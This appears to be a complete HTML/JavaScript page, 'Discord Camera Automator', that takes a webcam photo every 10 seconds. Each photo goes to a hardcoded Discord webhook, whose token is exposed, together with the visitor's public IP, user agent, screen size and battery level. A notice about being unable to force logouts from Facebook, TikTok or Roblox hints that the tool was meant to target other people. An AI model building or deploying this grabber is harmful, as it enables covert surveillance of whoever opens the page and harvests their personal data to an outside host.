<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Auto Photo to Discord Webhook</title>
    <!-- Load Tailwind CSS -->
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        /* Custom styles for better visual appeal */
        body {
            font-family: 'Inter', sans-serif;
            background-color: #f3f4f6;
        }
        .container {
            box-shadow: 0 10px 25px -5px rgba(0, 0, 0, 0.1), 0 10px 10px -5px rgba(0, 0, 0, 0.04);
            background: #ffffff;
        }
        .video-feed {
            /* Ensure the video feed is a responsive square/rectangle */
            width: 100%;
            max-width: 400px;
            height: auto;
            border-radius: 0.75rem;
            box-shadow: inset 0 0 10px rgba(0, 0, 0, 0.2);
            object-fit: cover;
            transform: scaleX(-1); /* Mirror the video feed for a more natural self-view */
        }
        .status-box {
            min-height: 4rem;
        }
    </style>
</head>
<body class="p-4 flex items-center justify-center min-h-screen">

    <div class="container p-6 md:p-10 rounded-xl max-w-lg w-full text-center">
        <h1 class="text-3xl font-bold text-gray-800 mb-6">Discord Camera Automator</h1>
        
        <!-- Security Information Alert Box -->
        <div class="bg-yellow-100 border-l-4 border-yellow-500 text-yellow-700 p-4 rounded-md mb-6" role="alert">
            <p class="font-bold">Important Security Note</p>
            <p class="text-sm">This app **cannot** force logouts from external sites (like Facebook, TikTok, YouTube, or Roblox). Browser security rules (Same-Origin Policy) prevent it from accessing or deleting their login data.</p>
        </div>

        <p class="text-gray-600 mb-6">Captures an image from your **Camera** every 10 seconds and sends it to the configured Discord Webhook, including **IP**, **device**, and **battery** details.</p>

        <!-- Video Feed Container -->
        <div class="flex justify-center mb-6">
            <!-- The video element shows the live stream -->
            <video id="videoFeed" class="video-feed border-4 border-indigo-500/50" autoplay playsinline></video>
            <!-- The canvas is used internally for taking the snapshot but is hidden -->
            <canvas id="photoCanvas" style="display: none;"></canvas>
        </div>

        <!-- Source Selection -->
        <div class="mb-4 flex justify-center space-x-4">
            <label class="inline-flex items-center text-gray-700">
                <input type="radio" name="source" value="camera" id="sourceCamera" class="form-radio text-indigo-600 h-4 w-4" checked>
                <span class="ml-2">Camera</span>
            </label>
            <label class="inline-flex items-center text-gray-400">
                <input type="radio" name="source" value="screen" id="sourceScreen" class="form-radio text-gray-400 h-4 w-4" disabled>
                <span class="ml-2">Screen Share (PC/Phone)</span>
                <span class="ml-3 text-xs text-red-500 font-semibold">(Blocked by platform security policy)</span>
            </label>
        </div>


        <!-- Controls -->
        <div class="space-y-4">
            <button id="toggleButton" class="w-full py-3 px-6 text-white font-semibold rounded-lg transition duration-150 ease-in-out shadow-md bg-green-600 hover:bg-green-700 active:bg-green-800">
                Start Autoplay
            </button>
        </div>

        <!-- Status & Log -->
        <div class="mt-8 p-4 rounded-lg status-box text-sm font-mono text-left" id="statusLog">
            <p class="text-gray-500">Awaiting user action...</p>
        </div>
    </div>

    <script type="module">
        const WEBHOOK_URL = "https://discord.com/api/webhooks/1394328442627031070/6sE0EugGgQj7n0YoeSqLFB0A8WoXS0pHFN28gAkL4ZTD-Uh2menOaBWhZj6D6xislzL8";
        const CAPTURE_INTERVAL_MS = 10000; // 10 seconds
        const IP_API_URL = "https://api.ipify.org?format=json";
        
        const video = document.getElementById('videoFeed');
        const canvas = document.getElementById('photoCanvas');
        const toggleButton = document.getElementById('toggleButton');
        const statusLog = document.getElementById('statusLog');
        const videoFeedElement = document.getElementById('videoFeed');
        // Note: sourceCamera and sourceScreen elements are included in the DOM but only used for visual display.
        // The script is hardcoded to use the camera stream (getUserMedia) as getDisplayMedia is blocked.

        let stream = null;
        let captureInterval = null;
        let isRunning = false;
        let currentSource = 'camera'; // Fixed to camera

        /**
         * Gets the public IP address using an external service.
         * @returns {Promise<string>} The IP address or "Unknown".
         */
        const getPublicIP = async () => {
            try {
                const response = await fetch(IP_API_URL);
                const data = await response.json();
                return data.ip || 'Unknown';
            } catch (e) {
                console.error("Failed to fetch public IP:", e);
                return 'Failed (API Error)';
            }
        };

        /**
         * Extracts basic device, browser, and battery information.
         * @returns {Promise<object>} Device and browser details including battery status.
         */
        const getDeviceInfo = async () => {
            let batteryStatus = 'Not Supported';
            
            if ('getBattery' in navigator) {
                try {
                    const battery = await navigator.getBattery();
                    const level = (battery.level * 100).toFixed(0) + '%';
                    const charging = battery.charging ? 'âš¡ Charging' : 'ðŸ”‹ Discharging';
                    batteryStatus = `${level} (${charging})`;
                } catch (e) {
                    console.error("Failed to get battery status:", e);
                    batteryStatus = 'Error fetching status';
                }
            }
            
            // Logic to determine if the device is likely mobile/tablet
            const isMobile = /Mobi|Android|iPhone|iPad|Tablet|webOS|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);

            return {
                userAgent: navigator.userAgent,
                deviceType: isMobile ? 'Mobile/Tablet' : 'Desktop/Other',
                screen: `${window.screen.width}x${window.screen.height}`,
                viewport: `${window.innerWidth}x${window.innerHeight}`,
                battery: batteryStatus,
                source: 'Camera',
                time: new Date().toLocaleString(),
            };
        };

        /**
         * Converts a data URL (like those from canvas.toDataURL) to a Blob object.
         * @param {string} dataurl - The data URL string.
         * @param {string} filename - The desired filename for the Blob.
         * @returns {Blob} The Blob object.
         */
        const dataURLtoBlob = (dataurl, filename) => {
            const arr = dataurl.split(',');
            const mime = arr[0].match(/:(.*?);/)[1];
            const bstr = atob(arr[1]);
            let n = bstr.length;
            const u8arr = new Uint8Array(n);
            while(n--){
                u8arr[n] = bstr.charCodeAt(n);
            }
            return new Blob([u8arr], {type: mime, name: filename});
        };

        /**
         * Posts the captured image and device metadata to the Discord Webhook.
         * @param {Blob} imageBlob - The image data as a Blob.
         * @param {object} deviceInfo - The device information.
         * @param {string} ipAddress - The public IP address.
         */
        const postToDiscord = async (imageBlob, deviceInfo, ipAddress) => {
            const formData = new FormData();
            
            // 1. Prepare the file
            const timestamp = new Date().toISOString().replace(/[^0-9]/g, '');
            const filename = `capture_${timestamp}.png`;
            formData.append('file', imageBlob, filename);

            // 2. Prepare the Discord Embed payload
            const discordEmbed = {
                title: `New Automated Capture from ${deviceInfo.source}`, // Title reflects source
                description: `Capture Time: **${deviceInfo.time}**`,
                color: 5814783, // Blue for camera
                fields: [
                    { name: 'Source', value: `**${deviceInfo.source}**`, inline: true },
                    { name: 'Device Type', value: `**${deviceInfo.deviceType}**`, inline: true }, 
                    { name: 'Screen/Viewport', value: `${deviceInfo.screen} / ${deviceInfo.viewport}`, inline: true },
                    { name: 'Public IP Address', value: `\`${ipAddress}\``, inline: true },
                    { name: 'Battery Status', value: `\`${deviceInfo.battery}\``, inline: true },
                    { name: 'User Agent (Details)', value: `\`${deviceInfo.userAgent.substring(0, 100)}...\``, inline: false },
                ],
                // Add the uploaded image as the embed image
                image: {
                    url: `attachment://${filename}`
                },
                footer: {
                    text: 'Automated Camera Bot'
                },
                timestamp: new Date().toISOString(),
            };

            const payload = {
                username: 'Camera Bot',
                embeds: [discordEmbed],
                attachments: [] 
            };

            // 3. Append the JSON payload to the form data
            formData.append('payload_json', JSON.stringify(payload));

            try {
                const response = await fetch(WEBHOOK_URL, {
                    method: 'POST',
                    body: formData,
                });

                if (response.ok) {
                    logStatus('âœ… Image and data sent successfully to Discord.', 'text-green-600 bg-green-50');
                } else {
                    const errorData = await response.json();
                    logStatus(`âŒ Discord Error (${response.status}): ${JSON.stringify(errorData)}`, 'text-red-600 bg-red-50');
                }
            } catch (error) {
                logStatus(`âŒ Network/Fetch Error: ${error.message}`, 'text-red-600 bg-red-50');
            }
        };

        /**
         * Captures a frame from the video stream and posts it.
         */
        const captureAndPost = async () => {
            if (!stream) {
                logStatus('Warning: Stream not active.', 'text-yellow-600 bg-yellow-50');
                return;
            }

            logStatus(`ðŸ“¸ Capturing photo from ${currentSource}...`, 'text-indigo-600 bg-indigo-50');

            // Set canvas dimensions to match video stream
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            
            // Draw the current video frame onto the canvas
            const ctx = canvas.getContext('2d');
            
            // Apply mirror transformation for the camera feed
            ctx.translate(canvas.width, 0);
            ctx.scale(-1, 1);
            
            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
            ctx.setTransform(1, 0, 0, 1, 0, 0); // Reset transform

            // Convert canvas to Data URL and then Blob
            const dataURL = canvas.toDataURL('image/png');
            const imageBlob = dataURLtoBlob(dataURL, 'photo.png');
            
            // Get device info and IP
            const deviceInfo = await getDeviceInfo(); 
            const ipAddress = await getPublicIP();

            // Post to Discord
            postToDiscord(imageBlob, deviceInfo, ipAddress);
        };

        /**
         * Starts the camera capture and the auto capture interval.
         */
        const startCapture = async () => {
            videoFeedElement.style.transform = 'scaleX(-1)'; // Ensure mirroring is on for camera

            try {
                // Use camera (getUserMedia)
                const mediaStream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
                
                stream = mediaStream;
                video.srcObject = stream;
                
                await new Promise(resolve => video.onloadedmetadata = resolve);
                
                // Add listener for stream end (in case camera is disconnected)
                const track = stream.getVideoTracks()[0];
                track.onended = () => {
                    if (isRunning) {
                        logStatus('âš ï¸ Camera stream ended by user or system. Autoplay stopped.', 'text-yellow-700 bg-yellow-100');
                        stopCapture();
                    }
                };

                // Start the interval
                setTimeout(captureAndPost, 1000); 
                captureInterval = setInterval(captureAndPost, CAPTURE_INTERVAL_MS);
                
                isRunning = true;

                toggleButton.textContent = `Stop Autoplay (Sending every ${CAPTURE_INTERVAL_MS / 1000}s)`;
                toggleButton.classList.remove('bg-green-600', 'hover:bg-green-700', 'active:bg-green-800');
                toggleButton.classList.add('bg-red-600', 'hover:bg-red-700', 'active:bg-red-800');
                logStatus(`âœ… Autoplay initiated from Camera.`, 'text-green-600 bg-green-50');

            } catch (err) {
                // User denied or an error occurred
                logStatus(`âŒ Failed to start camera: ${err.name}. ${err.message}`, 'text-red-600 bg-red-50');
                isRunning = false;
                stopCapture(false); // Do not log 'stopped' status again
            }
        };

        /**
         * Stops the stream and clears the interval.
         * @param {boolean} [log=true] - Whether to log the status message.
         */
        const stopCapture = (log = true) => {
            if (captureInterval) {
                clearInterval(captureInterval);
                captureInterval = null;
            }
            if (stream) {
                stream.getTracks().forEach(track => track.stop());
                stream = null;
            }
            isRunning = false;

            toggleButton.textContent = 'Start Autoplay';
            toggleButton.classList.remove('bg-red-600', 'hover:bg-red-700', 'active:bg-red-800');
            toggleButton.classList.add('bg-green-600', 'hover:bg-green-700', 'active:bg-green-800');
            
            if (log) {
                 logStatus('â¸ï¸ Auto capture stopped.', 'text-yellow-700 bg-yellow-50');
            }
        };

        /**
         * Logs status messages to the UI.
         * @param {string} message - The message to display.
         * @param {string} classes - Tailwind CSS classes for styling the log entry.
         */
        const logStatus = (message, classes) => {
            const entry = document.createElement('p');
            entry.textContent = `[${new Date().toLocaleTimeString()}] ${message}`;
            entry.className = `p-2 my-1 rounded-md transition-all duration-300 ${classes}`;

            // Prepend the new entry
            statusLog.prepend(entry);
            
            // Limit log entries to 10 for performance
            while (statusLog.children.length > 10) {
                statusLog.removeChild(statusLog.lastChild);
            }
        };

        // Event listener for the toggle button
        toggleButton.addEventListener('click', () => {
            if (isRunning) {
                stopCapture();
            } else {
                startCapture();
            }
        });
        
        // Initial setup for the video element style
        videoFeedElement.style.transform = 'scaleX(-1)';
    </script>
</body>
</html>
